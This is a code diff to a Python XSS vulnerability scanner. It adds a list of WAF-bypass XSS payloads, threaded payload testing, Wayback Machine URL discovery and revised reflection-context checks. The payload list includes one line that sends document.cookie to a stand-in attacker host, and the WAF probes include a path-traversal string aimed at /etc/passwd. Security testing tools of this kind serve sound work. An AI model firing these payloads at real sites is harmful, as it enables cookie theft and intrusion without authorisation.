@@ -12,6 +12,7 @@ import re
 import sys
 import time
 import random
+import concurrent.futures
 
 # Force UTF-8 output for Windows
 if sys.platform == 'win32':
@@ -361,6 +362,77 @@ class XSSScanner:
         '--!><svg/onload=alert(1)>',
         '<svg><animate xlink:href="#x" attributeName="href" values="javascript:alert(1)" /></svg>',
         '<math><a xlink:href="javascript:alert(1)">click',
+    ]
+    
+    # =================================================================
+    # WAF BYPASS SPECIFIC PAYLOADS (Prioritized in WAF Mode)
+    # =================================================================
+    WAF_BYPASS_PAYLOADS = [
+        # POLYGLOTS
+        'javascript://%250Aalert(1)//',
+        '<svg/onload=alert(1)<!--',
+        '\'"><svg/onload=alert(1)>',
+        '/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
+        
+        # PROTOCOL OBSCURITY
+        '<a href="javas\x00cript:alert(1)">click</a>',
+        '<a href="javascript:x=\'&#64;\';alert(1)">click</a>',
+        '<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>',
+        
+        # MATH/SVG CHAINS
+        '<math><mtext><table><mglyph><style><img src onerror=alert(1)>',
+        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
+        '<svg><set onbegin=alert(1) attributename=x>',
+        
+        # ES6 / MODERN JS
+        '<script>x=>1;alert(1)</script>',
+        '<script>[(1,2)].find(alert)</script>',
+        '<script>fetch("https://attacker.com?cookie="+document.cookie)</script>',
+        
+        # DOUBLE/TRIPLE ENCODING & NULL BYTES
+        '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
+        '%2522%253E%253Cscript%253Ealert(1)%253C%252Fscript%253E',
+        
+        # FRAMEWORK/TEMPLATE INJECTION
+        '{{constructor.constructor(\'alert(1)\')()}}',
+        '{{7*7}}',
+        '${7*7}',
+        '#{7*7}',
+        '<%= 7*7 %>',
+        
+        # CLOUDFLARE / AKAMAI / GENERAL BYPASS ATTEMPTS
+        '<img src=x onerror=alert`1`>',
+        '<img src=x onerror=alert&lpar;1&rpar;>',
+        '<svg/onload=alert&lpar;1&rpar;>',
+        '<script>eval(atob("YWxlcnQoMSk="))</script>',
+        '<body onpageshow=alert(1)>',
+        '<body onfocus=alert(1)>',
+        '<details ontoggle=alert(1)>',
+        '<div contextmenu=x oncontextmenu=alert(1)>',
+        '<input type="search" onsearch="alert(1)">',
+        
+        # UNUSUAL TAGS/HANDLERS
+        '<marquee onstart=alert(1)>',
+        '<video oncanplay=alert(1)>',
+        '<audio ondurationchange=alert(1)>',
+        '<keygen onfocus=alert(1)>',
+        
+        # NESTED / MALFORMED
+        '<scr<script>ipt>alert(1)</script>',
+        '<<script>alert(1)//<</script>',
+        '<script>/*//*/alert(1)//</script>',
+        
+        # DATA URI
+        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+        
+        # MORE ADVANCED
+        '<x onclick=alert(1) src=a>Click',
+        '<x onmouseover=alert(1) src=a>Hover',
+        '<svg/onload=location="javas"+"cript:ale"+"rt(1)">',
+        '<script>window["alert"](1)</script>',
+        '<script>parent["alert"](1)</script>',
+        '<script>self["alert"](1)</script>',
+        '<script>top["alert"](1)</script>',
     ]
     
     # WAF Detection Signatures - ULTRA Comprehensive Database (160+ WAFs)
@@ -869,7 +941,9 @@ class XSSScanner:
         },
         'litespeed': {
             'server': ['litespeed'],
-            'body': ['litespeed', 'litespeed technologies'],
+            'headers': ['x-litespeed-', 'ls_'],
+            'body': ['litespeed', 'litespeed technologies', 'powered by litespeed', 'ls_'],
+            'cookies': ['ls_smartpush'],
         },
         'imunify360': {
             'body': ['imunify360', 'cloudlinux'],
@@ -1727,11 +1801,21 @@ class XSSScanner:
         """Get payloads to use - custom if provided, otherwise built-in (with WAF bypass if enabled)"""
         if self.custom_payloads:
             return self.custom_payloads
-        # If WAF bypass mode is enabled and WAF was detected, use bypass payloads first
-        if self.waf_bypass and self.waf_detected:
-            return self.WAF_BYPASS_PAYLOADS + self.PAYLOADS
-        elif self.waf_bypass:
-            return self.WAF_BYPASS_PAYLOADS + self.PAYLOADS
+            
+        # Refined Logic: Only use WAF bypass payloads if WAF bypass is enabled AND a WAF is actually detected
+        # This prevents wasting time sending heavy payloads to a site with no WAF
+        if self.waf_bypass:
+            if self.waf_detected:
+                return self.WAF_BYPASS_PAYLOADS + self.PAYLOADS
+            else:
+                # WAF bypass enabled but no WAF detected
+                # We can either warn and skip, or just skip. 
+                # Let's check if we've already warned
+                if not hasattr(self, '_waf_warn_shown'):
+                    print(f"{Fore.YELLOW}[!] WAF Bypass enabled but no WAF detected. Skipping bypass payloads for efficiency.{Style.RESET_ALL}")
+                    self._waf_warn_shown = True
+                return self.PAYLOADS
+                
         return self.PAYLOADS
     
     def detect_waf(self):
@@ -1746,6 +1830,9 @@ class XSSScanner:
             '../../../etc/passwd',
         ]
         
+        # Track if we had ANY successful response
+        successful_probes = 0
+        connection_errors = 0
         detected_wafs = []
         
         for probe in probe_payloads:
@@ -1753,6 +1840,7 @@ class XSSScanner:
                 # Try GET request with probe
                 test_url = f"{self.target}?xss_test={probe}"
                 response = self.session.get(test_url, timeout=self.timeout, verify=False, allow_redirects=True)
+                successful_probes += 1
                 
                 # Analyze response for WAF signatures
                 waf_result = self._analyze_response_for_waf(response)
@@ -1762,6 +1850,7 @@ class XSSScanner:
                 time.sleep(0.2)
                 
             except requests.exceptions.RequestException as e:
+                connection_errors += 1
                 if self.verbose:
                     print(f"{Fore.YELLOW}[~] Probe request failed: {e}{Style.RESET_ALL}")
                 continue
@@ -1769,11 +1858,12 @@ class XSSScanner:
         # Also check a normal request for WAF signatures
         try:
             response = self.session.get(self.target, timeout=self.timeout, verify=False)
+            successful_probes += 1
             waf_result = self._analyze_response_for_waf(response)
             if waf_result:
                 detected_wafs.extend(waf_result)
         except:
-            pass
+            connection_errors += 1
         
         # Deduplicate and prioritize
         detected_wafs = list(set(detected_wafs))
@@ -1789,7 +1879,10 @@ class XSSScanner:
             self._print_waf_detection_result(detected_wafs)
             return detected_wafs
         else:
-            print(f"{Fore.GREEN}[+] No WAF detected{Style.RESET_ALL}")
+            if successful_probes == 0 and connection_errors > 0:
+                print(f"{Fore.RED}[!] WAF detection failed: Connection timeout/error{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.GREEN}[+] No WAF detected{Style.RESET_ALL}")
             return []
     
     def _analyze_response_for_waf(self, response):
@@ -2120,7 +2213,7 @@ class XSSScanner:
 ║           {Fore.YELLOW}[!] {Fore.RED}For Authorized Security Testing Only{Fore.YELLOW} [!]{Fore.CYAN}              ║
 ║{Fore.YELLOW}   ≋★                                                          ★≋    {Fore.CYAN}║
 ╚{'═'*69}╝{Style.RESET_ALL}
-{Fore.GREEN}[+] Version: 1.1 (WAF Fix Applied){Style.RESET_ALL}
+{Fore.GREEN}{Style.RESET_ALL}
 """
         print(banner)
     
@@ -2130,6 +2223,13 @@ class XSSScanner:
         print(f"{Fore.CYAN}[*] Max depth: {Fore.WHITE}{self.max_depth}{Style.RESET_ALL}\n")
         
         queue = deque([(self.target, 0)])
+        
+        # Seed crawl with Wayback URLs if enabled
+        if self.param_discovery:
+            historical_urls = self._extract_wayback_params(self.target)
+            for hist_url in historical_urls:
+                if self._is_same_domain(hist_url):
+                    queue.append((hist_url, 0))
         
         while queue:
             url, depth = queue.popleft()
@@ -2236,8 +2336,7 @@ class XSSScanner:
             # Mine for reflected parameters using smart wordlist
             self._mine_reflected_params(self.target)
             
-            # Check Wayback Machine for historical parameters
-            self._extract_wayback_params(self.target)
+
         
         # Brute-force common parameters ONCE on the main target (not every page)
         if self.brute_params:
@@ -2827,7 +2926,7 @@ class XSSScanner:
                         print(f"{Fore.YELLOW}[+] Hidden input: {Fore.WHITE}{name} {Fore.CYAN}@ {base_url}{Style.RESET_ALL}")
     
     def _extract_wayback_params(self, url):
-        """Extract parameters from Wayback Machine archives - ADVANCED"""
+        """Extract URLs and parameters from Wayback Machine archives - ADVANCED"""
         from urllib.parse import urlparse
         base_url = self._get_base_url(url)
         domain = urlparse(url).netloc
@@ -2835,20 +2934,54 @@ class XSSScanner:
         if base_url not in self.found_params:
             self.found_params[base_url] = {'get': set(), 'post': set()}
         
-        print(f"{Fore.CYAN}[*] Checking Wayback Machine for historical parameters...{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[*] Checking Wayback Machine for historical URLs...{Style.RESET_ALL}")
+        
+        discovered_wayback_urls = []
+        ignored_extensions = [
+            '.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.woff', '.woff2', 
+            '.ttf', '.eot', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.zip', '.tar', '.gz', 
+            '.mp3', '.mp4', '.avi', '.mov', '.xml', '.json', '.txt'
+        ]
         
         try:
-            # Query Wayback Machine CDX API for URLs with parameters
-            wayback_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=text&fl=original&filter=original:.*[?].*&limit=50"
+            # Query Wayback Machine CDX API for ALL URLs (up to 500)
+            # filter=statuscode:200 to only get valid pages
+            wayback_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=text&fl=original&filter=statuscode:200&limit=500"
             response = self.session.get(wayback_url, timeout=15, verify=False)
             
             if response.status_code == 200:
                 found_count = 0
-                for line in response.text.strip().split('\n')[:50]:
-                    if '?' in line:
-                        # Extract parameters from archived URLs
+                lines = response.text.strip().split('\n')
+                
+                # Use a set to avoid duplicates immediately
+                unique_urls = set()
+                
+                for line in lines:
+                    full_url = line.strip()
+                    if not full_url: 
+                        continue
+                        
+                    # Skip static files based on extension
+                    is_static = False
+                    lower_url = full_url.lower().split('?')[0] # Check extension on path only
+                    for ext in ignored_extensions:
+                        if lower_url.endswith(ext):
+                            is_static = True
+                            break
+                    
+                    if is_static:
+                        continue
+                        
+                    unique_urls.add(full_url)
+                
+                # Process the unique URLs
+                for full_url in unique_urls:
+                    discovered_wayback_urls.append(full_url)
+                    
+                    # Also extract parameters if present (legacy support)
+                    if '?' in full_url:
                         try:
-                            query_string = line.split('?')[1].split('#')[0]
+                            query_string = full_url.split('?')[1].split('#')[0]
                             for param_pair in query_string.split('&'):
                                 if '=' in param_pair:
                                     param = param_pair.split('=')[0]
@@ -2858,15 +2991,20 @@ class XSSScanner:
                                             self.discovered_params.add(param)
                                             found_count += 1
                         except:
-                            continue
+                            pass
                 
-                if found_count > 0:
-                    print(f"{Fore.GREEN}[+] Discovered {found_count} parameters from Wayback Machine!{Style.RESET_ALL}")
+                if discovered_wayback_urls:
+                    print(f"{Fore.GREEN}[+] Discovered {len(discovered_wayback_urls)} historical URLs from Wayback Machine!{Style.RESET_ALL}")
+                    if found_count > 0:
+                        print(f"{Fore.GREEN}[+] Also extracted {found_count} historical parameters{Style.RESET_ALL}")
                 else:
-                    print(f"{Fore.YELLOW}[~] No additional parameters found in archives{Style.RESET_ALL}")
-        except:
-            if self.verbose:
-                print(f"{Fore.YELLOW}[~] Wayback Machine check skipped{Style.RESET_ALL}")
+                    print(f"{Fore.YELLOW}[~] No relevant historical URLs found in archives{Style.RESET_ALL}")
+                    
+        except Exception as e:
+             if self.verbose:
+                print(f"{Fore.YELLOW}[~] Wayback Machine check skipped: {e}{Style.RESET_ALL}")
+        
+        return discovered_wayback_urls
     
     def _extract_robots_sitemap(self, url):
         """Extract URLs and parameters from robots.txt and sitemap.xml - ADVANCED"""
@@ -3001,7 +3139,7 @@ class XSSScanner:
         if found_count > 0:
             print(f"{Fore.GREEN}[+] Mined {found_count} reflected parameters!{Style.RESET_ALL}")
         else:
-            print(f"{Fore.YELLOW}[~] No reflected parameters found via mining{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[~] No reflected parameters found via mining{Style.RESET_ALL}\n")
     
     def test_xss(self):
         """Test XSS payloads on discovered parameters"""
@@ -3207,11 +3345,100 @@ class XSSScanner:
             if all_params:
                 print(f"{Fore.BLUE}└─ {Fore.GREEN}✓ Complete{Style.RESET_ALL}")
                 print()
+
+    def _print_vuln_report(self, vuln_data, count):
+        """Print a detailed vulnerability report card"""
+        # Determine colors based on severity
+        severity = vuln_data.get('severity', 'medium').upper()
+        sev_color = Fore.YELLOW
+        if severity == 'CRITICAL': sev_color = Fore.RED + Style.BRIGHT
+        elif severity == 'HIGH': sev_color = Fore.RED
+        elif severity == 'LOW': sev_color = Fore.GREEN
+        
+        # Determine context icon/text
+        context = vuln_data.get('context', 'unknown').upper()
+        
+        print(f"\n{Fore.RED}┌─ [{count}] {Style.BRIGHT}Reflected XSS{Style.RESET_ALL} ─ {sev_color}{severity} SEVERITY{Style.RESET_ALL}")
+        print(f"{Fore.RED}│ {Fore.WHITE}🌐 URL: {Fore.BLUE}{vuln_data['url']}{Style.RESET_ALL}")
+        print(f"{Fore.RED}│ {Fore.WHITE}📍 Parameter: {Fore.CYAN}{vuln_data['param']}{Style.RESET_ALL}")
+        print(f"{Fore.RED}│ {Fore.WHITE}🔧 Method: {Fore.MAGENTA}{vuln_data['method']}{Style.RESET_ALL}")
+        print(f"{Fore.RED}│ {Fore.WHITE}🎯 Context: {Fore.YELLOW}{context}{Style.RESET_ALL}")
+        print(f"{Fore.RED}│ {Fore.WHITE}🚀 Payload: {Fore.GREEN}{vuln_data['payload']}{Style.RESET_ALL}")
+        print(f"{Fore.RED}│ {Fore.WHITE}🔗 Test URL: {Fore.BLUE}{vuln_data['full_url']}{Style.RESET_ALL}")
+        print(f"{Fore.RED}│ {Fore.WHITE}📊 Confidence: {Fore.GREEN}Very High{Style.RESET_ALL}")
+        print(f"{Fore.RED}│ {Fore.WHITE}🏷️  CVEs: {Fore.CYAN}CWE-79 (XSS){Style.RESET_ALL}{Fore.RED}") # Closing the box implicitly by color reset or next line
+        print(f"{Fore.RED}└───────────────────────────────────────────────────────────────{Style.RESET_ALL}\n")
     
-    def _test_param(self, url, param, method):
-        """Test a parameter with all XSS payloads"""
+    def _test_single_payload(self, url, param, method, payload, is_waf_bypass):
+        """Test a single payload (helper for threading)"""
         from urllib.parse import quote
         import threading
+
+        try:
+            encoded_payload = quote(payload, safe='')
+            
+            # Use shorter timeout for WAF bypass payloads to avoid tarpitting
+            # Standard timeout for regular payloads
+            request_timeout = 5 if is_waf_bypass else self.timeout
+            
+            if method == 'GET':
+                # Build URL with payload
+                test_url = f"{url}?{param}={encoded_payload}"
+                encoded_url = test_url
+                full_url = f"{url}?{param}={payload}"
+                response = self.session.get(test_url, timeout=request_timeout, verify=False)
+            else:
+                # POST request with payload
+                data = {param: payload}
+                test_url = url
+                full_url = f"{url} [POST: {param}={payload}]"
+                encoded_url = f"{url}?{param}={encoded_payload}"
+                response = self.session.post(url, data=data, timeout=request_timeout, verify=False)
+            
+            # Check if payload is reflected WITH TIMEOUT
+            # Use threading to enforce a timeout on reflection checking
+            # Reduced timeout for WAF bypass efficiency
+            reflection_timeout = 2.0 if is_waf_bypass else 3.0
+            
+            reflection_result = [False]
+            
+            def check_with_timeout():
+                try:
+                    reflection_result[0] = self._check_reflection(response.text, payload)
+                except Exception:
+                    reflection_result[0] = False
+            
+            check_thread = threading.Thread(target=check_with_timeout, daemon=True)
+            check_thread.start()
+            check_thread.join(timeout=reflection_timeout)
+            
+            if check_thread.is_alive():
+                 return None # Timeout
+            
+            if reflection_result[0]:
+                # Classify the vulnerability
+                classification = self._classify_xss_type(url, param, method, payload, response)
+                
+                return {
+                    'url': url,
+                    'param': param,
+                    'method': method,
+                    'payload': payload,
+                    'full_url': full_url,
+                    'encoded_url': encoded_url,
+                    'status_code': response.status_code,
+                    'type': classification['type'],
+                    'context': classification['context'],
+                    'severity': classification['severity']
+                }
+                
+        except Exception:
+            pass
+            
+        return None
+
+    def _test_param(self, url, param, method):
+        """Test a parameter with all XSS payloads using multithreading"""
         
         # Skip if we already found a vuln for this param (first_only mode)
         param_key = f"{url}|{param}|{method}"
@@ -3221,88 +3448,58 @@ class XSSScanner:
         payloads = self.get_payloads()
         total_payloads = len(payloads)
         
-        # Check if we're using WAF bypass payloads (only when user explicitly requested it)
-        is_waf_bypass = self.waf_bypass
-        bypass_payload_count = len(self.WAF_BYPASS_PAYLOADS)
+        # Only consider it effective WAF bypass mode if we are actually using those payloads
+        # (i.e., WAF was detected OR user force-enabled it - but our get_payloads logic now handles that)
+        # We need to know if we are actually iterating over bypass payloads
+        is_waf_bypass_active = self.waf_bypass and self.waf_detected
         
-        for idx, payload in enumerate(payloads, 1):
-            try:
-                encoded_payload = quote(payload, safe='')
-                
-                # Display bypass payload being tested when WAF bypass mode is active
-                if is_waf_bypass and self.verbose:
-                    # Check if this is a bypass payload (first N payloads are bypass payloads)
-                    if idx <= bypass_payload_count:
-                        payload_preview = payload[:50] + '...' if len(payload) > 50 else payload
-                        print(f"{Fore.MAGENTA}    ├─ [Bypass {idx}/{bypass_payload_count}] {Fore.YELLOW}{payload_preview}{Style.RESET_ALL}")
-                elif is_waf_bypass and idx <= bypass_payload_count:
-                    # Even without verbose, show a progress indicator for bypass payloads
-                    if idx == 1 or idx % 25 == 0 or idx == bypass_payload_count:
-                        print(f"{Fore.MAGENTA}    ├─ Testing WAF bypass payloads... [{idx}/{bypass_payload_count}]{Style.RESET_ALL}", end='\r')
-                
-                if method == 'GET':
-                    # Build URL with payload
-                    test_url = f"{url}?{param}={encoded_payload}"
-                    encoded_url = test_url  # URL-encoded version for browser
-                    full_url = f"{url}?{param}={payload}"  # Readable version
-                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
-                else:
-                    # POST request with payload
-                    data = {param: payload}
-                    test_url = url
-                    full_url = f"{url} [POST: {param}={payload}]"
-                    # User requested URL only, even for POST. Many times POST parameters also work as GET.
-                    encoded_url = f"{url}?{param}={encoded_payload}"
-                    response = self.session.post(url, data=data, timeout=self.timeout, verify=False)
-                
-                # Check if payload is reflected WITH TIMEOUT
-                # Use threading to enforce a 5-second timeout on reflection checking
-                is_reflected = False
-                reflection_result = [False]  # Use list to share result between threads
-                
-                def check_with_timeout():
-                    try:
-                        reflection_result[0] = self._check_reflection(response.text, payload)
-                    except Exception:
-                        reflection_result[0] = False
-                
-                check_thread = threading.Thread(target=check_with_timeout, daemon=True)
-                check_thread.start()
-                check_thread.join(timeout=5.0)  # 5-second timeout for reflection check
-                
-                if check_thread.is_alive():
-                    # Reflection check timed out - skip this payload
-                    if self.verbose:
-                        print(f"{Fore.YELLOW}    [!] Skipping payload {idx} (reflection check timeout){Style.RESET_ALL}")
-                    continue
-                
-                is_reflected = reflection_result[0]
-                
-                if is_reflected:
-                    vuln = {
-                        'url': url,
-                        'param': param,
-                        'method': method,
-                        'payload': payload,
-                        'full_url': full_url,
-                        'encoded_url': encoded_url,
-                        'status_code': response.status_code
-                    }
-                    self.vulnerabilities.append(vuln)
-                    self.tested_params.add(param_key)
-                    
-                    # In first_only mode, stop after first successful payload
-                    if self.first_only:
-                        return True
-                
-                time.sleep(0.02)  # Small delay between requests
-                
-            except requests.exceptions.RequestException:
-                continue
-            except Exception:
-                continue
+        # Determine thread count - higher for WAF bypass to speed it up
+        max_workers = 15 if is_waf_bypass_active else 10
         
-        return False
+        found_vuln = False
+        
+        # Use ThreadPoolExecutor for concurrent payload testing
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+            # Submit all tasks
+            future_to_payload = {
+                executor.submit(self._test_single_payload, url, param, method, p, is_waf_bypass_active): p 
+                for p in payloads
+            }
+            
+            completed_count = 0
+            bypass_count = len(self.WAF_BYPASS_PAYLOADS) if is_waf_bypass_active else 0
+            
+            for future in concurrent.futures.as_completed(future_to_payload):
+                completed_count += 1
+                payload = future_to_payload[future]
+                
+                # Progress update logic
+                if is_waf_bypass_active:
+                     # Show more detailed progress for WAF bypass
+                     if completed_count % 5 == 0 or completed_count == total_payloads:
+                         print(f"{Fore.MAGENTA}    ├─ WAF Bypass / Payload Testing... [{completed_count}/{total_payloads}]{Style.RESET_ALL}", end='\r')
+                
+                try:
+                    result = future.result()
+                    if result:
+                        self.vulnerabilities.append(result)
+                        self.tested_params.add(param_key)
+                        found_vuln = True
+                        
+                        # Print the report immediately
+                        vuln_count = len(self.vulnerabilities)
+                        self._print_vuln_report(result, vuln_count)
+                        
+                        # If first_only is set, we can cancel other futures or just return
+                        # cancelling is hard with threads, but we can return early
+                        if self.first_only:
+                            executor.shutdown(wait=False)
+                            return True
+                            
+                except Exception:
+                    pass
+        
+        return found_vuln
     
     def _classify_xss_type(self, url, param, method, payload, response):
         """Classify the XSS vulnerability type - ADVANCED"""
@@ -3507,29 +3704,83 @@ class XSSScanner:
             before = context[:rel_pos].lower()
             after = context[rel_pos + len(test_value):].lower()
             
-            # Check for HTML tag context
-            if '<' in before and '>' not in before[before.rfind('<'):]:
-                # Inside an opening tag
-                if 'href=' in before or 'src=' in before or 'action=' in before:
-                    contexts.append({'type': 'url_attribute', 'position': idx})
-                elif 'on' in before and '=' in before:
-                    contexts.append({'type': 'event_handler', 'position': idx})
-                elif 'value=' in before or 'placeholder=' in before:
-                    contexts.append({'type': 'input_value', 'position': idx})
-                else:
-                    contexts.append({'type': 'html_attribute', 'position': idx})
-            elif '<script' in before and '</script>' not in before:
-                # Inside JavaScript
-                contexts.append({'type': 'javascript', 'position': idx})
-            elif '<style' in before and '</style>' not in before:
-                # Inside CSS
-                contexts.append({'type': 'css', 'position': idx})
-            elif '<!--' in before and '-->' not in before[before.rfind('<!--'):]:
-                # Inside HTML comment
-                contexts.append({'type': 'html_comment', 'position': idx})
+            # Check for HTML tag context - simplified for speed but reasonably robust
+            last_tag_open = before.rfind('<')
+            last_tag_close = before.rfind('>')
+            
+            if last_tag_open != -1 and (last_tag_close == -1 or last_tag_open > last_tag_close):
+                # Inside an opening tag (likely attribute)
+                
+                # Determine the ACTIVE attribute (closest to the payload)
+                last_equals = before.rfind('=')
+                
+                context_type = 'html_attribute' # Default
+                
+                if last_equals != -1:
+                    # Find the attribute name before this '='
+                    attr_chunk = before[:last_equals].rstrip()
+                    
+                    # Iterate backwards to find start of attribute name
+                    attr_name_end = len(attr_chunk)
+                    attr_name_start = attr_name_end
+                    
+                    for i in range(attr_name_end - 1, -1, -1):
+                        char = attr_chunk[i]
+                        if char == ' ' or char == '\t' or char == '\n' or char == '"' or char == "'" or char == '<':
+                            break
+                        attr_name_start = i
+                    
+                    current_attr = attr_chunk[attr_name_start:attr_name_end].lower()
+                    
+                    if current_attr in ['href', 'src', 'action', 'formaction', 'data', 'content']:
+                        context_type = 'url_attribute'
+                    elif current_attr.startswith('on'):
+                        context_type = 'event_handler'
+                    elif current_attr in ['value', 'placeholder', 'title', 'alt']:
+                        context_type = 'html_attribute' # Explicitly safe-ish
+                
+                contexts.append({'type': context_type, 'position': idx})
+            
+            # Check for Script Block context (Robust)
             else:
-                # Regular HTML content
-                contexts.append({'type': 'html_body', 'position': idx})
+                last_script_open = before.lower().rfind('<script')
+                last_script_close = before.lower().rfind('</script')
+                
+                if last_script_open != -1 and (last_script_close == -1 or last_script_open > last_script_close):
+                    # Inside JavaScript
+                    
+                    # Check if inside a JS string
+                    # Look for unclosed quotes after the last script tag
+                    script_content = before[last_script_open:]
+                    
+                    # Simple heuristic for JS string: Count quotes not preceded by backslash
+                    # This is complex to do perfectly with regex in reverse, so we use a simplified check
+                    # checking the character immediately preceding or close to text
+                    
+                    is_js_string = False
+                    trimmed_before = before.rstrip()
+                    if trimmed_before:
+                        last_char = trimmed_before[-1]
+                        if last_char in ['"', "'", '`']:
+                            is_js_string = True
+                        elif last_char == '=': 
+                            # var x = payload; <- Not a string typically, often raw injection
+                            pass
+                    
+                    if is_js_string:
+                        contexts.append({'type': 'javascript_string', 'position': idx})
+                    else:
+                        contexts.append({'type': 'javascript', 'position': idx})
+                        
+                elif '<style' in before.lower() and '</style>' not in before.lower()[before.lower().rfind('<style'):]:
+                    # Inside CSS (Approximation)
+                    contexts.append({'type': 'css', 'position': idx})
+                elif '<!--' in before and '-->' not in before[before.rfind('<!--'):]:
+                    # Inside HTML comment
+                    contexts.append({'type': 'html_comment', 'position': idx})
+                else:
+                    # Regular HTML content
+                    contexts.append({'type': 'html_body', 'position': idx})
             
             idx += 1
         
@@ -3704,20 +3955,9 @@ class XSSScanner:
                 
             # Found a reflection! Now verify it's dangerous
             
-            # Check if the payload variant itself contains dangerous patterns
-            payload_lower = matched_payload.lower()
-            payload_has_dangerous_pattern = False
-            for pattern in self.DANGEROUS_PATTERNS:
-                if pattern in payload_lower:
-                    payload_has_dangerous_pattern = True
-                    break
-            
-            if not payload_has_dangerous_pattern:
-                # This variant is safe (e.g., fully encoded), try the next one
-                continue
-            
-            # This variant IS dangerous (e.g., decoded script tag)
-            # Now verify its context in the response
+            # Use sophisticated context detection instead of simple pattern matching
+            # This handles cases where encoded payloads are reflected as plain text (safe)
+            # vs. decoded payloads reflected in dangerous contexts (vulnerable)
             
             # Find all occurrences of this specific variant (limit to first 10 to prevent hangs)
             search_start = 0
@@ -3731,44 +3971,74 @@ class XSSScanner:
                 
                 occurrence_count += 1
                 
-                # Found the dangerous variant - check context (comments, etc.)
-                context_start = max(0, idx - 100)
-                context_end = min(len(response_text), idx + len(matched_payload) + 100)
-                context = response_text[context_start:context_end]
+                # Get the context using our robust detector
+                # We need to look before/after this specific occurrence
+                # Helper: use a snippet around the match
                 
-                payload_rel_pos = idx - context_start
+                # Verify if this specific reflection is dangerous
+                is_dangerous = False
                 
-                # Check for comments (with safety limit on iterations)
-                in_comment = False
-                i = 0
-                max_context_iterations = len(context) + 1  # Safety limit
-                iterations = 0
-                while i < len(context) and iterations < max_context_iterations:
-                    iterations += 1
-                    if context[i:i+4] == '<!--':
-                        comment_end = context.find('-->', i + 4)
-                        if comment_end != -1:
-                            if i < payload_rel_pos < comment_end + 3:
-                                in_comment = True
-                                break
-                            i = comment_end + 3
-                        else:
-                            # Unclosed comment
-                            if i < payload_rel_pos:
-                                in_comment = True
-                                break
-                            i += 4
-                    else:
-                        i += 1
+                # 1. First, check if the payload itself contains dangerous injection characters
+                # If the payload is just alphanumeric "alert(1)", it's only dangerous in specific contexts (like JS)
+                # If the payload contains HTML tags "<script...", it's dangerous in HTML body
                 
-                if not in_comment:
+                payload_lower = matched_payload.lower()
+                has_tags = '<' in matched_payload and '>' in matched_payload
+                has_quotes = '"' in matched_payload or "'" in matched_payload
+                
+                # Get context type for this specific location
+                contexts = self._detect_context(response_text, matched_payload)
+                # Filter to the one that matches our current index (approximate check as detect_context finds all)
+                current_context_type = 'html_body' # Default
+                
+                for ctx in contexts:
+                    # Check if this context corresponds to our current match position
+                    # Allow small offset difference due to how detect_context might calculate pos
+                    if abs(ctx['position'] - idx) < 5:
+                        current_context_type = ctx['type']
+                        break
+                
+                if current_context_type == 'javascript':
+                    # In JS context, "alert(1)" is dangerous even without tags
+                    if 'alert' in payload_lower or 'prompt' in payload_lower or 'confirm' in payload_lower:
+                        is_dangerous = True
+                        
+                elif current_context_type == 'event_handler':
+                    # In event handler (on*="..."), any code execution is dangerous
+                    if 'alert' in payload_lower or 'prompt' in payload_lower:
+                        is_dangerous = True
+                        
+                elif current_context_type == 'url_attribute':
+                    # In URL context (href="..."), "javascript:" is dangerous
+                    if 'javascript:' in payload_lower:
+                        is_dangerous = True
+                        
+                elif current_context_type == 'html_body':
+                    # In HTML body, we NEED tags (<script, <img, etc.) for it to be XSS
+                    # Just reflecting "alert(1)" or "%3Cscript..." is NOT XSS
+                    if has_tags:
+                        # Must look like a tag: <[a-z]
+                        if re.search(r'<[a-z/!?]', matched_payload, re.I):
+                             is_dangerous = True
+                             
+                elif current_context_type == 'html_attribute':
+                    # In normal attribute (value="..."), we need to break out
+                    # Payload must have quotes to break out
+                    if has_quotes or '>' in matched_payload:
+                        is_dangerous = True
+                
+                elif current_context_type == 'html_comment':
+                     # Never dangerous in comments unless breaking out (which changes context)
+                     is_dangerous = False
+
+                if is_dangerous:
                     # Valid dangerous reflection found!
-                    # ADDITIONAL SAFETY CHECK: Check for safe contexts (textarea, title, etc.)
+                    # ADDITIONAL SAFETY CHECK: Check for safe tags (textarea, title, etc.)
                     if self._is_safe_context(response_text, idx, matched_payload):
                         # It's in a safe context (like <title>...</title>), treating as not vulnerable
-                        continue
-                        
-                    return True
+                        pass
+                    else:
+                        return True
                 
                 search_start = idx + len(matched_payload)  # Skip past current match
         
